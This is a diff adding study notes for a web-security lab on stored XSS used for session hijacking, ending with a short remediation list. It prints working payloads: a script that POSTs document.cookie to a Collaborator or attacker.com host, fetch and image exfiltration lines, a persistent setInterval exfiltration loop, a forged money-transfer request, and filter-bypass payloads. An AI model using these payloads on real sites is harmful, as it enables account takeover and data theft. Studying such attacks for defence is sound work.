@@ -10494,3 +10494,504 @@ Angular creates new execution engine
 ```
 When CSP blocks JavaScript → let AngularJS execute it for you
 ```
+
+# 🐞Lab-26 — Stored XSS → Session Hijacking (Cookie Exfiltration)
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates a **Stored Cross-Site Scripting (XSS)** attack where:
+
+✔ Attacker injects JavaScript into a comment  
+✔ A victim (admin) views the comment  
+✔ Script executes in victim’s browser  
+✔ Victim’s session cookie is exfiltrated  
+✔ Attacker reuses cookie → account takeover  
+
+---
+
+### 🧠 Big Concept
+
+```
+XSS = Controlling victim’s browser
+```
+
+NOT just:
+
+```
+alert(1)
+```
+
+---
+
+## 🔹 What Is This Topic?
+
+---
+
+### 🔴 Stored XSS
+
+✔ Malicious JavaScript is stored on server  
+✔ Executes automatically when victim visits page  
+
+---
+
+### 🎯 Goal of This Lab
+
+```
+Steal session cookie → impersonate victim
+```
+
+---
+
+## 🔄 Execution Flow
+
+```
+Attacker Input → Stored on Server → Victim Visits Page
+→ Script Executes → Data Exfiltration → Account Takeover
+```
+
+---
+
+## 🧪 Lab Walkthrough (Step-by-Step)
+
+---
+
+### 1️⃣ Get Collaborator URL
+
+---
+
+👉 In Burp Suite:
+
+```
+abcd1234.burpcollaborator.net
+```
+
+---
+
+👉 This acts as:
+
+```
+Attacker-controlled server (data receiver)
+```
+
+---
+
+### 2️⃣ Inject Payload in Comment
+
+---
+
+```
+<script>
+fetch('https://YOUR-COLLABORATOR', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+});
+</script>
+```
+
+---
+
+👉 Submit as blog comment
+
+---
+
+### 3️⃣ Victim Visits Page
+
+---
+
+👉 Admin opens blog post
+
+```
+→ Stored payload executes automatically
+```
+
+---
+
+### 4️⃣ Cookie Exfiltration
+
+---
+
+Victim browser sends:
+
+```
+POST https://your-collaborator
+BODY: session=abc123
+```
+
+---
+
+👉 You capture this in Collaborator
+
+---
+
+### 5️⃣ Session Hijacking
+
+---
+
+Replace your cookie:
+
+```
+Cookie: session=abc123
+```
+
+---
+
+👉 Result:
+
+```
+Logged in as victim (admin)
+```
+
+---
+
+## 💣 Payload Breakdown (Easy)
+
+---
+
+### 🔹 Full Payload
+
+```
+fetch('https://attacker.com', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+});
+```
+
+---
+
+### 🔹 Part 1 — `fetch()`
+
+```
+fetch('https://attacker.com')
+```
+
+👉 Sends request to attacker server
+
+---
+
+### 🔹 Part 2 — `method: 'POST'`
+
+```
+method: 'POST'
+```
+
+👉 Sends data inside request body
+
+---
+
+### 🔹 Part 3 — `mode: 'no-cors'`
+
+```
+mode: 'no-cors'
+```
+
+👉 Bypasses browser restrictions  
+👉 Response not needed
+
+---
+
+### 🔹 Part 4 — `document.cookie`
+
+```
+document.cookie
+```
+
+👉 Extracts:
+
+```
+session=abc123
+```
+
+---
+
+👉 Sent to attacker server
+
+---
+
+## 🧠 Full Attack Flow
+
+```
+1. Attacker injects script
+2. Victim loads page
+3. Script executes
+4. Browser sends request
+5. Cookie included in body
+6. Attacker captures cookie
+7. Attacker logs in as victim
+```
+
+---
+
+## 🌍 Real-World Scenarios & Bypasses
+
+---
+
+### 🔴 Scenario 1 — HttpOnly Cookies
+
+---
+
+❌ Problem:
+
+```
+document.cookie not accessible
+```
+
+---
+
+### ✅ Bypass (Indirect Data Theft)
+
+```
+fetch('/api/user')
+  .then(r => r.text())
+  .then(data => fetch('https://attacker.com?d=' + data));
+```
+
+---
+
+🧠 Logic:
+
+✔ Browser sends cookies automatically  
+✔ Server returns sensitive data  
+✔ You steal response instead  
+
+---
+
+### 🔴 Scenario 2 — Session Bound to IP / Device
+
+---
+
+❌ Problem:
+
+```
+Stolen cookie useless externally
+```
+
+---
+
+### ✅ Bypass (Act as Victim)
+
+```
+fetch('/api/transfer', {
+  method: 'POST',
+  body: 'amount=1000&to=attacker'
+});
+```
+
+---
+
+🧠 Logic:
+
+✔ Request executed from victim browser  
+✔ Server trusts session  
+✔ Action performed  
+
+---
+
+### 🔴 Scenario 3 — Victim Not Logged In
+
+---
+
+❌ Problem:
+
+```
+No session available
+```
+
+---
+
+### ✅ Bypass (Persistence)
+
+```
+setInterval(() => {
+  fetch('/api/user')
+    .then(r => r.text())
+    .then(d => fetch('https://attacker.com?d=' + d));
+}, 5000);
+```
+
+---
+
+🧠 Logic:
+
+✔ Wait until login  
+✔ Then extract data  
+
+---
+
+### 🔴 Scenario 4 — Session Expiry
+
+---
+
+❌ Problem:
+
+```
+Short-lived sessions
+```
+
+---
+
+### ✅ Bypass (Continuous Execution)
+
+```
+setInterval(() => {
+  fetch('/api/data')
+}, 3000);
+```
+
+---
+
+### 🔴 Scenario 5 — CSP (Content Security Policy)
+
+---
+
+❌ Problem:
+
+```
+External requests blocked
+```
+
+---
+
+### ✅ Bypass Ideas
+
+---
+
+✔ Same-origin requests:
+
+```
+fetch('/internal-api')
+```
+
+---
+
+✔ Image-based exfiltration:
+
+```
+new Image().src = "https://attacker.com?c=" + document.cookie;
+```
+
+---
+
+✔ Framework abuse:
+
+```
+Use AngularJS / template injection techniques
+```
+
+---
+
+### 🔴 Scenario 6 — WAF Filtering
+
+---
+
+❌ Problem:
+
+```
+<script>, alert(), () blocked
+```
+
+---
+
+### ✅ Bypass Techniques
+
+---
+
+✔ Encoded payloads:
+
+```
+&lt;script&gt;
+```
+
+---
+
+✔ Event-based payloads:
+
+```
+<img src=x onerror=alert(1)>
+```
+
+---
+
+✔ Advanced techniques:
+
+```
+throw/onerror
+template literals
+AngularJS bypass
+```
+
+---
+
+## 🔗 Attack Chains (Real Bug Bounty)
+
+---
+
+### 🔥 Chain 1
+
+```
+XSS → Steal CSRF token → Change password → Account takeover
+```
+
+---
+
+### 🔥 Chain 2
+
+```
+XSS → Perform API requests → Extract sensitive data
+```
+
+---
+
+### 🔥 Chain 3
+
+```
+XSS → Keylogger → Capture credentials
+```
+
+---
+
+## 🛡️ Remediation
+
+---
+
+✔ Escape user input (HTML encoding)  
+✔ Use HttpOnly cookies  
+✔ Implement CSP properly  
+✔ Avoid inline JavaScript  
+✔ Sanitize input strictly  
+
+---
+
+## 🧠 Mental Model (MOST IMPORTANT)
+
+---
+
+❌ XSS is NOT about:
+
+```
+alert(1)
+```
+
+---
+
+✔ XSS IS about:
+
+```
+Controlling browser
+Sending requests
+Stealing data
+Acting as the user
+```
+
+---
+
+## 🎯 Final Truth
+
+```
+If JavaScript executes → attacker controls everything the user can do
+```
+
+---
